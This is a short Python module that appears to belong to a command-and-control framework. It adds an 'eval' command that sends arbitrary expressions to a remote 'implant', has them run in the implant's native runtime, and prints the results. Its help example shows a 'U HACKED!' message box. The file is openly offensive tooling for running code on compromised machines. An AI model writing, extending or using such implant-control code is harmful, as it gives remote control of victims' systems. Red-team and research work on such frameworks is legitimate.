from features import addFeature
import messages
from messages import OutgoingMessage

class EvalCommand():
  command = 'eval'

  def run(arguments, implant):
    if not implant:
      print('use implant first!')
    else:
      message = OutgoingMessage(EvalCommand.command, bytes(' '.join(arguments), 'ascii'))
      implant.queueOutgoingMessage(message)

  def help():
    return 'Evaluate expressions in the implant\'s native language runtime. Usage: eval Msgbox("U HACKED!")'

  def incoming(data, implant):
    try:
      data = str(data, 'utf-8') 
      print(data, end = '\n', flush=True)
    except:
      print('Received unencodable eval data from ' + implant.name + ': ' + data.hex())

addFeature(EvalCommand)
